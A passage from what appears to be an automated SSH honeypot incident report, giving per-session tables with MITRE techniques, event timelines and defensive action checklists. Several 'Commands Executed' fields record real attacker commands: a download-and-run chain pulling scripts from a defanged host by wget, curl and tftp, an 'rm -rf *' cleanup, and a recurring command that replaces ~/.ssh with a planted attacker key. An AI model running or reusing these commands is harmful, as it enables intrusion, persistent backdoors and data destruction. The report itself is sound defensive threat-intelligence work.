| `2026-09-20 15:00:50` | `cowrie.client.version` |
| `2026-09-20 15:00:50` | `cowrie.client.kex` |
| `2026-09-20 15:00:51` | `cowrie.login.success` |
| `2026-09-20 15:00:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.146.235[.]54` to AbuseIPDB if not already reported
- [ ] Block `61.146.235[.]54` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c5122cad588

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-09-20 15:03 |
| **Last Seen** | 2026-09-20 15:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca, ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 15:03:58` | `cowrie.session.connect` |
| `2026-09-20 15:03:58` | `cowrie.client.version` |
| `2026-09-20 15:03:58` | `cowrie.client.kex` |
| `2026-09-20 15:03:58` | `cowrie.login.success` |
| `2026-09-20 15:04:00` | `cowrie.session.params` |
| `2026-09-20 15:04:00` | `cowrie.command.input` |
| `2026-09-20 15:04:00` | `cowrie.session.file_download` |
| `2026-09-20 15:04:00` | `cowrie.session.file_download` |
| `2026-09-20 15:04:00` | `cowrie.log.closed` |
| `2026-09-20 15:04:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7717bd56d2e9

| Field | Detail |
|---|---|
| **Source IP** | `212.28.184[.]195` |
| **First Seen** | 2026-09-20 15:24 |
| **Last Seen** | 2026-09-20 15:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 15:24:16` | `cowrie.session.connect` |
| `2026-09-20 15:24:16` | `cowrie.client.version` |
| `2026-09-20 15:24:16` | `cowrie.client.kex` |
| `2026-09-20 15:24:16` | `cowrie.login.success` |
| `2026-09-20 15:24:17` | `cowrie.session.params` |
| `2026-09-20 15:24:17` | `cowrie.command.input` |
| `2026-09-20 15:24:17` | `cowrie.log.closed` |
| `2026-09-20 15:24:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.28.184[.]195` to AbuseIPDB if not already reported
- [ ] Block `212.28.184[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8379e3e08338

| Field | Detail |
|---|---|
| **Source IP** | `43.245.248[.]2` |
| **First Seen** | 2026-09-20 15:31 |
| **Last Seen** | 2026-09-20 15:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 15:31:29` | `cowrie.session.connect` |
| `2026-09-20 15:31:29` | `cowrie.client.version` |
| `2026-09-20 15:31:29` | `cowrie.client.kex` |
| `2026-09-20 15:31:30` | `cowrie.login.success` |
| `2026-09-20 15:31:31` | `cowrie.session.params` |
| `2026-09-20 15:31:31` | `cowrie.command.input` |
| `2026-09-20 15:31:31` | `cowrie.command.failed` |
| `2026-09-20 15:31:32` | `cowrie.log.closed` |
| `2026-09-20 15:31:32` | `cowrie.session.params` |
| `2026-09-20 15:31:32` | `cowrie.command.input` |
| `2026-09-20 15:31:33` | `cowrie.session.file_download` |
| `2026-09-20 15:31:33` | `cowrie.log.closed` |
| `2026-09-20 15:31:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.245.248[.]2` to AbuseIPDB if not already reported
- [ ] Block `43.245.248[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-145b6c798f89

| Field | Detail |
|---|---|
| **Source IP** | `43.245.248[.]2` |
| **First Seen** | 2026-09-20 15:31 |
| **Last Seen** | 2026-09-20 15:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 15:31:33` | `cowrie.session.connect` |
| `2026-09-20 15:31:33` | `cowrie.client.version` |
| `2026-09-20 15:31:33` | `cowrie.client.kex` |
| `2026-09-20 15:31:34` | `cowrie.login.success` |
| `2026-09-20 15:31:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.245.248[.]2` to AbuseIPDB if not already reported
- [ ] Block `43.245.248[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-214a2fe5e0eb

| Field | Detail |
|---|---|
| **Source IP** | `43.245.248[.]2` |
| **First Seen** | 2026-09-20 15:31 |
| **Last Seen** | 2026-09-20 15:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 15:31:35` | `cowrie.session.connect` |
| `2026-09-20 15:31:35` | `cowrie.client.version` |
| `2026-09-20 15:31:35` | `cowrie.client.kex` |
| `2026-09-20 15:31:36` | `cowrie.login.success` |
| `2026-09-20 15:31:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.245.248[.]2` to AbuseIPDB if not already reported
- [ ] Block `43.245.248[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cd6edeec6bf

| Field | Detail |
|---|---|
| **Source IP** | `106.75.222[.]86` |
| **First Seen** | 2026-09-20 15:37 |
| **Last Seen** | 2026-09-20 15:42 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 15:37:36` | `cowrie.session.connect` |
| `2026-09-20 15:37:36` | `cowrie.client.version` |
| `2026-09-20 15:37:36` | `cowrie.client.kex` |
| `2026-09-20 15:37:37` | `cowrie.login.success` |
| `2026-09-20 15:37:38` | `cowrie.session.params` |
| `2026-09-20 15:37:38` | `cowrie.command.input` |
| `2026-09-20 15:37:38` | `cowrie.command.failed` |
| `2026-09-20 15:42:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.75.222[.]86` to AbuseIPDB if not already reported
- [ ] Block `106.75.222[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb652177b5b5

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-20 15:38 |
| **Last Seen** | 2026-09-20 15:39 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 15:38:49` | `cowrie.session.connect` |
| `2026-09-20 15:38:49` | `cowrie.client.version` |
| `2026-09-20 15:38:50` | `cowrie.client.kex` |
| `2026-09-20 15:38:50` | `cowrie.login.success` |
| `2026-09-20 15:38:54` | `cowrie.direct-tcpip.request` |
| `2026-09-20 15:38:55` | `cowrie.direct-tcpip.ja4` |
| `2026-09-20 15:38:55` | `cowrie.direct-tcpip.data` |
| `2026-09-20 15:38:56` | `cowrie.direct-tcpip.request` |
| `2026-09-20 15:38:57` | `cowrie.direct-tcpip.ja4` |
| `2026-09-20 15:38:57` | `cowrie.direct-tcpip.data` |
| `2026-09-20 15:39:00` | `cowrie.direct-tcpip.request` |
| `2026-09-20 15:39:00` | `cowrie.direct-tcpip.ja4` |
| `2026-09-20 15:39:00` | `cowrie.direct-tcpip.data` |
| `2026-09-20 15:39:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

```
⚠️  MALWARE ANALYSIS — HIGH SEVERITY SAMPLE DETECTED
   File  : 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656  (ELF Binary (Linux executable))
   SHA256: 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aa...
   Score : 86/100  |  VT: 40/75
   ↳ Download via wget: wget
   ↳ Download via curl: curl
   ↳ Execution from /tmp: /tmp/bot
   ↳ chmod +x (make executable): chmod +x
```

### 🔴 HIGH · IR-1d455893be23

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-09-20 15:41 |
| **Last Seen** | 2026-09-20 15:41 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh; busybox wget hxxp://213.232.114[.]14/handshakebins.sh; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114[.]14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **Malware Analysis** | 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656 (HIGH) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 15:41:27` | `cowrie.session.connect` |
| `2026-09-20 15:41:27` | `cowrie.login.success` |
| `2026-09-20 15:41:27` | `cowrie.session.params` |
| `2026-09-20 15:41:29` | `cowrie.command.input` |
| `2026-09-20 15:41:29` | `cowrie.command.input` |
| `2026-09-20 15:41:30` | `cowrie.session.file_download` |
| `2026-09-20 15:41:30` | `cowrie.session.file_download` |
| `2026-09-20 15:41:30` | `cowrie.session.file_download` |
| `2026-09-20 15:41:31` | `cowrie.session.file_download` |
| `2026-09-20 15:41:31` | `cowrie.session.file_download.failed` |
| `2026-09-20 15:41:32` | `cowrie.session.file_download` |
| `2026-09-20 15:41:32` | `cowrie.session.file_download` |
| `2026-09-20 15:41:44` | `cowrie.log.closed` |
| `2026-09-20 15:41:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Review VT report: hxxps://www.virustotal.com/gui/file/07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db35b6ae6f3c

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]194` |
| **First Seen** | 2026-09-20 15:41 |
| **Last Seen** | 2026-09-20 15:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 15:41:48` | `cowrie.session.connect` |
| `2026-09-20 15:41:48` | `cowrie.client.version` |
| `2026-09-20 15:41:48` | `cowrie.client.kex` |
| `2026-09-20 15:41:48` | `cowrie.login.success` |
| `2026-09-20 15:41:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]194` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ed215fb9d86

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]118` |
| **First Seen** | 2026-09-20 15:46 |
| **Last Seen** | 2026-09-20 15:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 15:46:57` | `cowrie.session.connect` |
| `2026-09-20 15:46:57` | `cowrie.client.version` |
| `2026-09-20 15:46:57` | `cowrie.client.kex` |
| `2026-09-20 15:46:58` | `cowrie.login.success` |
| `2026-09-20 15:47:01` | `cowrie.direct-tcpip.request` |
| `2026-09-20 15:47:02` | `cowrie.direct-tcpip.ja4` |
| `2026-09-20 15:47:02` | `cowrie.direct-tcpip.data` |
| `2026-09-20 15:47:02` | `cowrie.direct-tcpip.request` |
| `2026-09-20 15:47:04` | `cowrie.direct-tcpip.ja4` |
| `2026-09-20 15:47:04` | `cowrie.direct-tcpip.data` |
| `2026-09-20 15:47:05` | `cowrie.direct-tcpip.request` |
| `2026-09-20 15:47:05` | `cowrie.direct-tcpip.ja4` |
| `2026-09-20 15:47:05` | `cowrie.direct-tcpip.data` |
| `2026-09-20 15:47:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]118` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]118` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-372bbeb991b8

| Field | Detail |
|---|---|
| **Source IP** | `172.210.53[.]194` |
| **First Seen** | 2026-09-20 16:33 |
| **Last Seen** | 2026-09-20 16:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:33:06` | `cowrie.session.connect` |
| `2026-09-20 16:33:06` | `cowrie.client.version` |
| `2026-09-20 16:33:06` | `cowrie.client.kex` |
| `2026-09-20 16:33:06` | `cowrie.login.success` |
| `2026-09-20 16:33:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.210.53[.]194` to AbuseIPDB if not already reported
- [ ] Block `172.210.53[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e688d73f969

| Field | Detail |
|---|---|
| **Source IP** | `140.99.83[.]52` |
| **First Seen** | 2026-09-20 16:34 |
| **Last Seen** | 2026-09-20 16:35 |
| **Session Duration** | 54s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:34:27` | `cowrie.session.connect` |
| `2026-09-20 16:34:33` | `cowrie.client.version` |
| `2026-09-20 16:34:33` | `cowrie.client.kex` |
| `2026-09-20 16:35:07` | `cowrie.login.success` |
| `2026-09-20 16:35:16` | `cowrie.session.params` |
| `2026-09-20 16:35:16` | `cowrie.command.input` |
| `2026-09-20 16:35:22` | `cowrie.log.closed` |
| `2026-09-20 16:35:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.99.83[.]52` to AbuseIPDB if not already reported
- [ ] Block `140.99.83[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c55c912bd121

| Field | Detail |
|---|---|
| **Source IP** | `187.154.98[.]53` |
| **First Seen** | 2026-09-20 16:37 |
| **Last Seen** | 2026-09-20 16:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:37:10` | `cowrie.session.connect` |
| `2026-09-20 16:37:10` | `cowrie.client.version` |
| `2026-09-20 16:37:10` | `cowrie.client.kex` |
| `2026-09-20 16:37:10` | `cowrie.login.success` |
| `2026-09-20 16:37:11` | `cowrie.session.params` |
| `2026-09-20 16:37:11` | `cowrie.command.input` |
| `2026-09-20 16:37:11` | `cowrie.command.failed` |
| `2026-09-20 16:37:11` | `cowrie.log.closed` |
| `2026-09-20 16:37:12` | `cowrie.session.params` |
| `2026-09-20 16:37:12` | `cowrie.command.input` |
| `2026-09-20 16:37:12` | `cowrie.session.file_download` |
| `2026-09-20 16:37:12` | `cowrie.log.closed` |
| `2026-09-20 16:37:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.154.98[.]53` to AbuseIPDB if not already reported
- [ ] Block `187.154.98[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-949d8cc8241c

| Field | Detail |
|---|---|
| **Source IP** | `187.154.98[.]53` |
| **First Seen** | 2026-09-20 16:37 |
| **Last Seen** | 2026-09-20 16:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:37:12` | `cowrie.session.connect` |
| `2026-09-20 16:37:12` | `cowrie.client.version` |
| `2026-09-20 16:37:12` | `cowrie.client.kex` |
| `2026-09-20 16:37:12` | `cowrie.login.success` |
| `2026-09-20 16:37:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.154.98[.]53` to AbuseIPDB if not already reported
- [ ] Block `187.154.98[.]53` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ff6606819e5

| Field | Detail |
|---|---|
| **Source IP** | `187.154.98[.]53` |
| **First Seen** | 2026-09-20 16:37 |
| **Last Seen** | 2026-09-20 16:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:37:13` | `cowrie.session.connect` |
| `2026-09-20 16:37:13` | `cowrie.client.version` |
| `2026-09-20 16:37:13` | `cowrie.client.kex` |
| `2026-09-20 16:37:13` | `cowrie.login.success` |
| `2026-09-20 16:37:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.154.98[.]53` to AbuseIPDB if not already reported
- [ ] Block `187.154.98[.]53` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-113a6bdcd137

| Field | Detail |
|---|---|
| **Source IP** | `49.72.212[.]22` |
| **First Seen** | 2026-09-20 16:37 |
| **Last Seen** | 2026-09-20 16:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:37:32` | `cowrie.session.connect` |
| `2026-09-20 16:37:32` | `cowrie.client.version` |
| `2026-09-20 16:37:33` | `cowrie.client.kex` |
| `2026-09-20 16:37:34` | `cowrie.login.success` |
| `2026-09-20 16:37:35` | `cowrie.session.params` |
| `2026-09-20 16:37:35` | `cowrie.command.input` |
| `2026-09-20 16:37:35` | `cowrie.command.failed` |
| `2026-09-20 16:37:35` | `cowrie.log.closed` |
| `2026-09-20 16:37:36` | `cowrie.session.params` |
| `2026-09-20 16:37:36` | `cowrie.command.input` |
| `2026-09-20 16:37:37` | `cowrie.session.file_download` |
| `2026-09-20 16:37:37` | `cowrie.log.closed` |
| `2026-09-20 16:37:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.72.212[.]22` to AbuseIPDB if not already reported
- [ ] Block `49.72.212[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e73613163c9

| Field | Detail |
|---|---|
| **Source IP** | `49.72.212[.]22` |
| **First Seen** | 2026-09-20 16:37 |
| **Last Seen** | 2026-09-20 16:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:37:37` | `cowrie.session.connect` |
| `2026-09-20 16:37:37` | `cowrie.client.version` |
| `2026-09-20 16:37:37` | `cowrie.client.kex` |
| `2026-09-20 16:37:38` | `cowrie.login.success` |
| `2026-09-20 16:37:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.72.212[.]22` to AbuseIPDB if not already reported
- [ ] Block `49.72.212[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-016b82e741eb

| Field | Detail |
|---|---|
| **Source IP** | `49.72.212[.]22` |
| **First Seen** | 2026-09-20 16:37 |
| **Last Seen** | 2026-09-20 16:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:37:38` | `cowrie.session.connect` |
| `2026-09-20 16:37:38` | `cowrie.client.version` |
| `2026-09-20 16:37:39` | `cowrie.client.kex` |
| `2026-09-20 16:37:40` | `cowrie.login.success` |
| `2026-09-20 16:37:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.72.212[.]22` to AbuseIPDB if not already reported
- [ ] Block `49.72.212[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-827af910b902

| Field | Detail |
|---|---|
| **Source IP** | `103.172.20[.]218` |
| **First Seen** | 2026-09-20 16:38 |
| **Last Seen** | 2026-09-20 16:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-20 16:38:20` | `cowrie.session.connect` |
| `2026-09-20 16:38:20` | `cowrie.client.version` |
| `2026-09-20 16:38:20` | `cowrie.client.kex` |
| `2026-09-20 16:38:21` | `cowrie.login.success` |
| `2026-09-20 16:38:22` | `cowrie.session.params` |
| `2026-09-20 16:38:22` | `cowrie.command.input` |
| `2026-09-20 16:38:22` | `cowrie.command.failed` |
| `2026-09-20 16:38:23` | `cowrie.log.closed` |
| `2026-09-20 16:38:23` | `cowrie.session.params` |
